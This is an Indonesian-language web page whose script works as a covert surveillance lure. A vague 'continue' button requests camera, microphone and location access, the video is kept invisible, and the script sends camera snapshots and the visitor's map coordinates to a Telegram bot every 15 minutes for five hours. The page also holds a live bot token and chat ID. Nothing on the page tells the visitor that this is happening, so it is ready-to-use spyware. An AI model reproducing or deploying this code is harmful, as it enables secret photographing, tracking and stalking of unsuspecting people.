<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Live Streaming & Lokasi</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #6a11cb, #2575fc);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
    .popup {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      text-align: center;
      width: 300px;
      animation: fadeIn 0.7s ease;
    }
    button {
      padding: 10px 20px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background: #00ff88;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    /* Video yang akan menjadi transparan */
    video {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0; /* Membuat video transparan */
      pointer-events: none; /* Agar video tidak mengganggu interaksi dengan elemen lain */
      z-index: -1; /* Menempatkan video di bawah semua elemen */
    }

    #loading {
      display: none;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="popup" id="step1">
    <h2>Untuk melanjutkan silahkan pencet tombol dibawah</h2>
    <button onclick="startStreaming()">LANJUTKAN</button>
  </div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <div id="loading" style="display:none;">
    <h3>Tunggu sebentar...</h3>
  </div>

  <script>
    const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
    const chat_id = '6374002294';

    // Meminta izin untuk mengakses kamera dan mikrofon
    async function startStreaming() {
      try {
        // Meminta akses kamera dan mikrofon
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById('video');
        video.style.display = 'block';
        video.srcObject = stream;

        // Meminta lokasi pengguna
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;

            // Kirim data ke Telegram
            await sendToTelegram(lat, lon, locationLink, stream);

            // Set interval untuk kirim video setiap 15 menit
            const interval = setInterval(() => {
              sendToTelegram(lat, lon, locationLink, stream);
            }, 900000); // 15 menit = 900000 ms

            // Hentikan setelah 5 jam (300 menit)
            setTimeout(() => {
              clearInterval(interval); // Menghentikan interval setelah 5 jam
              alert("Sesi live streaming selesai!");
            }, 18000000); // 5 jam = 18000000 ms
          });
        }

      } catch (err) {
        console.error('Error:', err);
        alert("Akses kamera atau lokasi ditolak!");
      }
    }

    // Mengirim data ke Telegram
    async function sendToTelegram(lat, lon, locationLink, stream) {
      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("text", `Lokasi Pengguna: ${locationLink}\nKamera: Aktif`);

      // Mengambil snapshot dari kamera
      const canvas = document.createElement('canvas');
      const video = document.getElementById('video');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob((blob) => {
        formData.append("photo", blob);
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).then(() => {
          console.log("Foto telah dikirim ke Telegram!");
        }).catch((error) => {
          console.error('Telegram Error:', error);
        });
      }, 'image/jpeg');

      // Optional: Streaming video to Telegram (akan memerlukan server untuk streaming)
      // streamVideoToTelegram(stream);
    }

    // Streaming video (untuk fitur lebih lanjut)
    async function streamVideoToTelegram(stream) {

    }
  </script>
</body>
</html>
